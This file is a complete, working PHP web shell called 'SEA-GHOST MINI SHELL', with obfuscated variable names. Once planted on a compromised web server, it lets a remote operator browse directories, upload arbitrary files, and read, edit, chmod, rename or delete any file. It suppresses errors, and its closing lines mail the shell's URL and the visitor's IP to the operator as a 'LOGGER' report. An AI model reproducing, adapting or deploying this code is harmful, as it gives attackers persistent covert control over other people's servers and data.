<?php

$email = "Your Email Here";

${"GLOBALS"}["nxezjenpfty"] = "pesan_alert";
${"GLOBALS"}["bdwfmxsdtyv"] = "info";
${"GLOBALS"}["xohfgty"] = "perms";
${"GLOBALS"}["xrtfdbo"] = "size";
${"GLOBALS"}["kuoxnmuuexse"] = "file";
${"GLOBALS"}["hwbscqvvwf"] = "dir";
${"GLOBALS"}["geiwotwl"] = "fp";
${"GLOBALS"}["sutdac"] = "tujuanmail";
${"GLOBALS"}["jthcxyt"] = "x_path";
${"GLOBALS"}["rvcnnj"] = "a";
${"GLOBALS"}["yrrcoy"] = "pat";
${"GLOBALS"}["esehjgofwv"] = "paths";
${"GLOBALS"}["denkosisrs"] = "tujuanmail";
${"GLOBALS"}["cibcgkympk"] = "path";
${"GLOBALS"}["fggjnumqc"] = "value";

@session_start();
@set_time_limit(0);
error_reporting(0);
set_time_limit(0);

$mlnwaxkulux = "path";
$bosbhjq = "path";

if (get_magic_quotes_gpc()) {
    $uumtjnf = "key";
    foreach ($_POST as ${$uumtjnf} => ${${"GLOBALS"}["fggjnumqc"]}) {
        $cndixwvne = "key";
        $_POST[${$cndixwvne}] = stripslashes(${${"GLOBALS"}["fggjnumqc"]});
    }
}
echo "<!DOCTYPE HTML><html><head><link href=\"https://fonts.googleapis.com/css?family=Exo\" rel=\"stylesheet\" type=\"text/css\"><link href=\"\" rel=\"stylesheet\" type=\"text/css\"><title>SEA-GHOST MINSHELL</title><link href=\"https://i.ibb.co/9VYB4QP/IMG-20200417-WA0014.jpg\" rel=\"icon\" type=\"image/x-icon\"><style> html {background-color: #000d2a;-webkit-background-size: cover;-moz-background-size: cover;-o-background-size: cover;background-size: cover;font-family: \"exo\", cursive;color: white;background:#000d2a;color:white;border:5px solid #02BC8C;border-radius:10px;} #content tr:hover{background:black;color:#02BC8C;border:2px solid #02BC8C;border-radius:10px;} #content .first{background:black;color:#02BC8C;border:2px solid #02BC8C;border-radius:10px;} #content .first:hover{background:black;color:#02BC8C;border:2px solid #02BC8C;border-radius:10px;} table{border: 2px #000d2a dotted;} H1{font-family :exo;} a{color: white;text-decoration: none;} a:hover{color: #fff;font-family :exo;text-shadow: 0 0 20px black, 0 0 5px black, 0 0 7px black, 0 0 45px black;} input,select,textarea{border: 1px #000000 solid;-moz-border-radius: 5px; -webkit-border-radius:5px;border-radius:5px; } </style></head><body><h1><center><font color=\"#02BC8C\">[</font><font color=\"white\">SEA-GHOST MINI SHELL</font><font color=\"#02BC8C\">]</font></center></h1><table width=\"700\" border=\"5\" cellpadding=\"5\" cellspacing=\"5\" align=\"center\"><tr><td><font face=\"exo\" color=\"white\">Path :</font>";

$kvqotya = "paths";
$gsuyghmyvjt = "id";

if (isset($_GET["path"])) {
    ${${"GLOBALS"}["cibcgkympk"]} = $_GET["path"];
} else {
    ${${"GLOBALS"}["cibcgkympk"]} = getcwd();
}

${$mlnwaxkulux} = str_replace("\"", "/", ${${"GLOBALS"}["cibcgkympk"]});
${$kvqotya} = explode("/", ${$bosbhjq});

foreach (
    ${${"GLOBALS"}["esehjgofwv"]}
    as ${$gsuyghmyvjt} => ${${"GLOBALS"}["yrrcoy"]}
) {
    $kihxvjqxeh = "id";
    $dxebagvxr = "id";
    if (${${"GLOBALS"}["yrrcoy"]} == "" && ${$dxebagvxr} == 0) {
        ${${"GLOBALS"}["rvcnnj"]} = true;
        echo "<a href=\"?path=/\">/</a>";
        continue;
    }

    ${"GLOBALS"}["rgzcpmiw"] = "i";
    $vxqchpixivo = "i";
    if (${${"GLOBALS"}["yrrcoy"]} == "") {
        continue;
    }

    echo "<a href=\"?path=";
    ${"GLOBALS"}["tpxtuiheqfd"] = "i";
    for (
        ${$vxqchpixivo} = 0;
        ${${"GLOBALS"}["tpxtuiheqfd"]} <= ${$kihxvjqxeh};
        ${${"GLOBALS"}["rgzcpmiw"]}++
    ) {
        ${"GLOBALS"}["zzkwlbmjtm"] = "i";
        ${"GLOBALS"}["srpejpn"] = "id";
        echo "$paths[$i]";
        if (${${"GLOBALS"}["zzkwlbmjtm"]} != ${${"GLOBALS"}["srpejpn"]}) {
            echo "/";
        }
    }

    echo "\">" . ${${"GLOBALS"}["yrrcoy"]} . "</a>/";
}

echo "</td></tr><tr><td>";

if (isset($_FILES["file"])) {
    if (
        copy(
            $_FILES["file"]["tmp_name"],
            ${${"GLOBALS"}["cibcgkympk"]} . "/" . $_FILES["file"]["name"]
        )
    ) {
        echo "<font color=\"#02BC8C\">[+] UPLOAD SUCCESSFUL [+]</font><br />";
    } else {
        echo "<font color=\"red\">[+] UPLOAD FAILED[+]</font><br/>";
    }
}

echo "<form enctype=\"multipart/form-data\" method=\"POST\"><font color=\"white\">FILE UPLOADER :</font> <input type=\"file\" name=\"file\" /><input type=\"submit\" value=\"UPLOAD\" style=\"font-family:exo;margin-top:4px;width:120px;background:#000000;color:#02BC8C;border:2px solid #02BC8C;border-radius:7px\"/></form></td></tr>";

if (isset($_GET["filesrc"])) {
    echo "<tr><td>Current File :";
    echo $_GET["filesrc"];
    echo "</tr></td></table><br />";
    echo "<pre>" .
        htmlspecialchars(file_get_contents($_GET["filesrc"])) .
        "</pre>";
} elseif (isset($_GET["option"]) && $_POST["opt"] != "delete") {
    echo "</table><br /><center>" . $_POST["path"] . "<br /><br />";
    if ($_POST["opt"] == "chmod") {
        if (isset($_POST["perm"])) {
            if (chmod($_POST["path"], $_POST["perm"])) {
                echo "<font color=\"#02BC8C\">CHANGE PERMISSION SUCCESSFUL </font><br/>";
            } else {
                echo "<font color=\"red\">CHANGE PERMISSION FAILED</font><br />";
            }
        }

        echo "<form method=\"POST\">Permission :<input name=\"perm\" type=\"text\" size=\"4\" value=\"" .
            substr(sprintf("%o", fileperms($_POST["path"])), -4) .
            "\" /><input type=\"hidden\" name=\"path\" value=\"" .
            $_POST["path"] .
            "\"><input type=\"hidden\" name=\"opt\" value=\"chmod\"><input type=\"submit\" value=\"Mpshh\" style=\"font-family:exo;margin-top:4px;width:37px;background:#000000;color:#02BC8C;border:2px solid #02BC8C;border-radius:5px\"/></form>";
    } elseif ($_POST["opt"] == "rename") {
        if (isset($_POST["newname"])) {
            $xdmxtkz = "path";
            if (rename($_POST["path"], ${$xdmxtkz} . "/" . $_POST["newname"])) {
                echo "<font color=\"#02BC8C\">GANTI NAMA SUCCESSFUL </font><br/>";
            } else {
                echo "<font color=\"red\">GANTI NAMA FAILED</font><br />";
            }
            $_POST["name"] = $_POST["newname"];
        }
        echo "<form method=\"POST\">
        New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"" .
            $_POST["name"] .
            "\" />
        <input type=\"hidden\" name=\"path\" value=\"" .
            $_POST["path"] .
            "\">
        <input type=\"hidden\" name=\"opt\" value=\"rename\">
        <input type=\"submit\" value=\"Rename\" style=\"font-family:exo;margin-top:4px;width:80px;background:#000000;color:#02BC8C;border:2px solid #02BC8C;border-radius:5px\"/>
        </form>";
    } elseif ($_POST["opt"] == "edit") {
        if (isset($_POST["src"])) {
            $bcwxmerpebv = "fp";
            ${"GLOBALS"}["chungpbwqsm"] = "fp";
            ${${"GLOBALS"}["chungpbwqsm"]} = fopen($_POST["path"], "w");
            if (fwrite(${$bcwxmerpebv}, $_POST["src"])) {
                echo "<font color=\"#02BC8C\">SUCCESSFUL  EDIT FILE</font><br/>";
            } else {
                echo "<font color=\"red\">FAILED EDIT FILE</font><br/>";
            }
            fclose(${${"GLOBALS"}["geiwotwl"]});
        }
        echo "<form method=\"POST\">
            <textarea cols=80 rows=20 name=\"src\">" .
            htmlspecialchars(file_get_contents($_POST["path"])) .
            "</textarea><br />
            <input type=\"hidden\" name=\"path\" value=\"" .
            $_POST["path"] .
            "\">
            <input type=\"hidden\" name=\"opt\" value=\"edit\">
            <input type=\"submit\" value=\"Save\" style=\"font-family:exo;margin-top:4px;width:70px;background:#000000;color:#02BC8C;border:2px solid #02BC8C;border-radius:5px\"/>
        </form>";
    }
    echo "</center>";
} else {
    echo "</table><br/><center>";
    if (isset($_GET["option"]) && $_POST["opt"] == "delete") {
        if ($_POST["type"] == "dir") {
            if (rmdir($_POST["path"])) {
                echo "<font color=\"#02BC8C\">DIRECTORY TERHAPUS</font><br/>";
            } else {
                echo "<font color=\"red\">DIRECTORY FAILED TERHAPUS</font><br/>";
            }
        } elseif ($_POST["type"] == "file") {
            if (unlink($_POST["path"])) {
                echo "<font color=\"#02BC8C\">FILE TERHAPUS</font><br/>";
            } else {
                echo "<font color=\"red\">FILE FAILED TERHAPUS</font><br/>";
            }
        }
    }
    $xneqmyqcl = "scandir";
    ${"GLOBALS"}["fdolsfc"] = "scandir";
    $miaurm = "path";
    echo "</center>";
    ${${"GLOBALS"}["fdolsfc"]} = scandir(${$miaurm});
    echo "<div id=\"content\"><table width=\"700\" border=\"5\" cellpadding=\"3\" cellspacing=\"5\" align=\"center\"><tr class=\"first\"><td><center>Name</peller></center></td><td><center>Size</peller></center></td><td><center>Permission</peller></center></td><td><center>Modify</peller></center></td></tr>";
    $smuccrtubx = "scandir";
    foreach (${$xneqmyqcl} as ${${"GLOBALS"}["hwbscqvvwf"]}) {
        ${"GLOBALS"}["ljuwupz"] = "path";
        $yuzlsededg = "path";
        $ospryr = "path";
        ${"GLOBALS"}["hmehoig"] = "path";
        ${"GLOBALS"}["oqmjoiqr"] = "dir";
        $wtylbxfqsxw = "dir";
        ${"GLOBALS"}["ifhespklp"] = "dir";
        if (
            !is_dir(${${"GLOBALS"}["ljuwupz"]} . "/" . ${$wtylbxfqsxw}) ||
            ${${"GLOBALS"}["hwbscqvvwf"]} == "." ||
            ${${"GLOBALS"}["hwbscqvvwf"]} == ".."
        ) {
            continue;
        }
        ${"GLOBALS"}["xxtutdr"] = "dir";
        ${"GLOBALS"}["oeheywklorm"] = "dir";
        $bgutyv = "dir";
        ${"GLOBALS"}["cxfqxs"] = "path";
        echo "<tr><td><a href=\"?path=" .
            ${${"GLOBALS"}["cxfqxs"]} .
            "/" .
            ${${"GLOBALS"}["oeheywklorm"]} .
            "\">" .
            ${${"GLOBALS"}["hwbscqvvwf"]} .
            "</a></td><td><center>--</center></td><td><center>";
        if (
            is_writable(
                ${${"GLOBALS"}["cibcgkympk"]} .
                    "/" .
                    ${${"GLOBALS"}["ifhespklp"]}
            )
        ) {
            echo "<font color=\"#02BC8C\">";
        } elseif (
            !is_readable(
                ${${"GLOBALS"}["cibcgkympk"]} . "/" . ${${"GLOBALS"}["xxtutdr"]}
            )
        ) {
            echo "<font color=\"red\">";
        }

        echo perms(
            ${${"GLOBALS"}["cibcgkympk"]} . "/" . ${${"GLOBALS"}["hwbscqvvwf"]}
        );
        if (
            is_writable(${$ospryr} . "/" . ${${"GLOBALS"}["hwbscqvvwf"]}) ||
            !is_readable(${${"GLOBALS"}["cibcgkympk"]} . "/" . ${$bgutyv})
        ) {
            echo "</font>";
        }
        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=" .
            ${${"GLOBALS"}["cibcgkympk"]} .
            "\"><select name=\"opt\"><option value=\"\">Select</option><option value=\"delete\">Delete</option><option value=\"chmod\">Chmod</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"" .
            ${${"GLOBALS"}["bxhvkoqws"]} .
            "\"><input type=\"hidden\" name=\"path\" value=\"" .
            ${${"GLOBALS"}["cibcgkympk"]} .
            "/" .
            ${${"GLOBALS"}["kuoxnmuuexse"]} .
            "\"><input type=\"submit\" value=\"+\" style=\"font-family:exo;margin-top:4px;width:35px;background:#000000;color:#02BC8C;border:2px solid #02BC8C;border-radius:5px\"/></form></center></td></tr>";
    }
    echo "<tr class=\"first\"><td></td><td></td><td></td><td></td></tr>";
    foreach (${$smuccrtubx} as ${${"GLOBALS"}["kuoxnmuuexse"]}) {
        ${"GLOBALS"}["rxyagprhl"] = "path";
        $wvptmoepx = "size";
        ${"GLOBALS"}["oouggdagf"] = "size";
        $yuprwhk = "size";
        if (
            !is_file(
                ${${"GLOBALS"}["rxyagprhl"]} .
                    "/" .
                    ${${"GLOBALS"}["kuoxnmuuexse"]}
            )
        ) {
            continue;
        }
        $xtmbdyhq = "path";
        $lztkfpnie = "file";
        ${"GLOBALS"}["bxhvkoqws"] = "file";
        $xqtvctffang = "path";
        ${${"GLOBALS"}["xrtfdbo"]} =
            filesize(
                ${${"GLOBALS"}["cibcgkympk"]} .
                    "/" .
                    ${${"GLOBALS"}["kuoxnmuuexse"]}
            ) / 1024;
        $jqssimhws = "file";
        ${"GLOBALS"}["gyocbv"] = "size";
        $tnmiwcnm = "file";
        ${$yuprwhk} = round(${${"GLOBALS"}["oouggdagf"]}, 3);
        if (${${"GLOBALS"}["gyocbv"]} >= 1024) {
            $erslhyu = "size";
            ${"GLOBALS"}["berpnlcl"] = "size";
            ${${"GLOBALS"}["berpnlcl"]} = round(${$erslhyu} / 1024, 2) . " MB";
        } else {
            $njcppxvqxxh = "size";
            ${${"GLOBALS"}["xrtfdbo"]} = ${$njcppxvqxxh} . " KB";
        }
        echo "<tr><td><a href=\"?filesrc=" .
            ${$xqtvctffang} .
            "/" .
            ${$jqssimhws} .
            "&path=" .
            ${$xtmbdyhq} .
            "\">" .
            ${${"GLOBALS"}["kuoxnmuuexse"]} .
            "</a></td><td><center>" .
            ${$wvptmoepx} .
            "</center></td><td><center>";
        if (is_writable(${${"GLOBALS"}["cibcgkympk"]} . "/" . ${$lztkfpnie})) {
            echo "<font color=\"#02BC8C\">";
        } elseif (
            !is_readable(${${"GLOBALS"}["cibcgkympk"]} . "/" . ${$tnmiwcnm})
        ) {
            echo "<font color=\"red\">";
        }
        $iibrglpzglvr = "path";
        echo perms(
            ${${"GLOBALS"}["cibcgkympk"]} .
                "/" .
                ${${"GLOBALS"}["kuoxnmuuexse"]}
        );
        if (
            is_writable(
                ${$iibrglpzglvr} . "/" . ${${"GLOBALS"}["kuoxnmuuexse"]}
            ) ||
            !is_readable(
                ${${"GLOBALS"}["cibcgkympk"]} .
                    "/" .
                    ${${"GLOBALS"}["kuoxnmuuexse"]}
            )
        ) {
            echo "</font>";
        }
        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=" .
            ${${"GLOBALS"}["cibcgkympk"]} .
            "\"><select name=\"opt\"><option value=\"\">Select</option><option value=\"delete\">Delete</option><option value=\"chmod\">Chmod</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"" .
            ${${"GLOBALS"}["bxhvkoqws"]} .
            "\"><input type=\"hidden\" name=\"path\" value=\"" .
            ${${"GLOBALS"}["cibcgkympk"]} .
            "/" .
            ${${"GLOBALS"}["kuoxnmuuexse"]} .
            "\"><input type=\"submit\" value=\"+\" style=\"font-family:exo;margin-top:4px;width:35px;background:#000000;color:#02BC8C;border:2px solid #02BC8C;border-radius:5px\"/></form></center></td></tr>";
    }
    echo "</table></div>";
}
echo "<br><center><font face=\"exo\">SEA-GHOST - SHELL CODING BY <a href=\"http://instagram.com/blackcyberanonymous\" target=\"_BLANK\"><font color=\"#02BC8C\">SEA-GHOST</a></font></center></body></html>";
function perms($file)
{
    ${"GLOBALS"}["koiepiagg"] = "perms";
    $nfwzxpyjy = "file";
    ${"GLOBALS"}["bpdjsjrjei"] = "perms";
    $irwsyhws = "info";
    $tsvofvmd = "info";
    $pldiihvx = "perms";
    ${"GLOBALS"}["jndnzmkmmwuu"] = "perms";
    ${${"GLOBALS"}["xohfgty"]} = fileperms(${$nfwzxpyjy});
    $dywjhjxvzc = "perms";
    ${"GLOBALS"}["mxqhjiusl"] = "perms";
    ${"GLOBALS"}["jndngswxa"] = "info";
    ${"GLOBALS"}["dtibhno"] = "info";
    ${"GLOBALS"}["sfuuqbp"] = "perms";
    ${"GLOBALS"}["rwnojmkon"] = "info";
    ${"GLOBALS"}["uuvjmytvcpho"] = "perms";
    $bfdywjsnx = "info";
    ${"GLOBALS"}["qszsrico"] = "perms";
    $clcmmvjbe = "perms";
    ${"GLOBALS"}["ttdnyeto"] = "perms";
    if ((${${"GLOBALS"}["koiepiagg"]} & 0xc000) == 0xc000) {
        ${${"GLOBALS"}["bdwfmxsdtyv"]} = "s";
    } elseif ((${$dywjhjxvzc} & 0xa000) == 0xa000) {
        $vwnqopstao = "info";
        ${$vwnqopstao} = "l";
    } elseif ((${${"GLOBALS"}["jndnzmkmmwuu"]} & 0x8000) == 0x8000) {
        $khiudj = "info";
        ${$khiudj} = "-";
    } elseif ((${${"GLOBALS"}["xohfgty"]} & 0x6000) == 0x6000) {
        ${${"GLOBALS"}["bdwfmxsdtyv"]} = "b";
    } elseif ((${${"GLOBALS"}["xohfgty"]} & 0x4000) == 0x4000) {
        $vfydcvtdvta = "info";
        ${$vfydcvtdvta} = "d";
    } elseif ((${${"GLOBALS"}["xohfgty"]} & 0x2000) == 0x2000) {
        ${${"GLOBALS"}["bdwfmxsdtyv"]} = "c";
    } elseif ((${${"GLOBALS"}["mxqhjiusl"]} & 0x1000) == 0x1000) {
        ${${"GLOBALS"}["bdwfmxsdtyv"]} = "p";
    } else {
        ${${"GLOBALS"}["bdwfmxsdtyv"]} = "u";
    }
    ${$irwsyhws} .= ${${"GLOBALS"}["xohfgty"]} & 0x0100 ? "r" : "-";
    ${${"GLOBALS"}["dtibhno"]} .= ${$pldiihvx} & 0x0080 ? "w" : "-";
    $qhybyg = "info";
    ${${"GLOBALS"}["bdwfmxsdtyv"]} .=
        ${${"GLOBALS"}["xohfgty"]} & 0x0040
            ? (${${"GLOBALS"}["sfuuqbp"]} & 0x0800
                ? "s"
                : "x")
            : (${${"GLOBALS"}["uuvjmytvcpho"]} & 0x0800
                ? "S"
                : "-");
    ${${"GLOBALS"}["jndngswxa"]} .=
        ${${"GLOBALS"}["xohfgty"]} & 0x0020 ? "r" : "-";
    ${${"GLOBALS"}["rwnojmkon"]} .=
        ${${"GLOBALS"}["xohfgty"]} & 0x0010 ? "w" : "-";
    ${$bfdywjsnx} .=
        ${${"GLOBALS"}["xohfgty"]} & 0x0008
            ? (${${"GLOBALS"}["qszsrico"]} & 0x0400
                ? "s"
                : "x")
            : (${$clcmmvjbe} & 0x0400
                ? "S"
                : "-");
    ${${"GLOBALS"}["bdwfmxsdtyv"]} .=
        ${${"GLOBALS"}["ttdnyeto"]} & 0x0004 ? "r" : "-";
    ${$tsvofvmd} .= ${${"GLOBALS"}["xohfgty"]} & 0x0002 ? "w" : "-";
    ${$qhybyg} .=
        ${${"GLOBALS"}["xohfgty"]} & 0x0001
            ? (${${"GLOBALS"}["xohfgty"]} & 0x0200
                ? "t"
                : "x")
            : (${${"GLOBALS"}["bpdjsjrjei"]} & 0x0200
                ? "T"
                : "-");
    return ${${"GLOBALS"}["bdwfmxsdtyv"]};
}
@ini_set("output_buffering", 0);
@ini_set("display_errors", 0);
set_time_limit(0);
ini_set("memory_limit", "64M");
header("Content-Type: text/html; charset=UTF-8");
${${"GLOBALS"}["sutdac"]} = $email;
${${"GLOBALS"}["jthcxyt"]} =
    "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
${${"GLOBALS"}["nxezjenpfty"]} =
    "fix $x_path :p *IP Address : [" . $_SERVER["REMOTE_ADDR"] . " ]";
mail(
    ${${"GLOBALS"}["denkosisrs"]},
    "LOGGER",
    ${${"GLOBALS"}["nxezjenpfty"]},
    "[" . $_SERVER["REMOTE_ADDR"] . " ]"
);

?>
